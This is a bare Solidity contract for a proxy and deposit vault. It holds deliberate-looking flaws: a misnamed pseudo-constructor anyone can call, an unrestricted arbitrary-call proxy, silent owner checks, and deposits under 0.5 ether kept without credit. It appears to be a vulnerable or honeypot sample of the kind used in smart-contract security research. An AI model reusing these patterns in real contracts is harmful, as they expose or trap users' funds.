pragma solidity ^0.4.24;

contract Proxy {
    struct OwnerData {
        address ownerAddress;
    }
    OwnerData ownerData = OwnerData(msg.sender);

    modifier onlyOwner { if (msg.sender == ownerData.ownerAddress) _; }

    function transferOwner(address _owner) public onlyOwner { ownerData.ownerAddress = _owner; } 
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    struct DepositData {
        address owner;
        mapping (address => uint256) deposits;
    }
    DepositData depositData;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            depositData.owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            depositData.deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount > 0 && depositData.deposits[msg.sender] >= amount) {
            msg.sender.transfer(amount);
        }
    }
}